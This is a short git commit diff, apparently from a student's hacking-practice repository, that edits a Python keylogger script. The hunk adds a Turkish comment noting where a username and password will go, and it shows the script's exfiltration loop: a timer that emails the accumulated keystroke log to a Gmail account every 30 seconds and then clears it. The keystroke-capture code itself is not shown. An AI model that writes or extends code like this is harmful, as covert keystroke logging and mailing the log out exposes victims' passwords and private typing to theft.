c391f9f7380d423442627a844d51d6c7e5949fb7
Ebubekir Dogan <ebubekir.dogan@bil.omu.edu.tr>
2022-06-25 21:18:43 +0300

    Packet-Listener

--- 3-Key-Logger/my_key_logger.py
+++ 3-Key-Logger/my_key_logger.py
@@ -30,7 +30,8 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("user@gmail.com", "password", log.encode('utf-8'))
+    ##Kullanıcı adı şifre burada alınacak
+    send_email("user@gmail.com", "password", log.encode('utf-8')) 
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
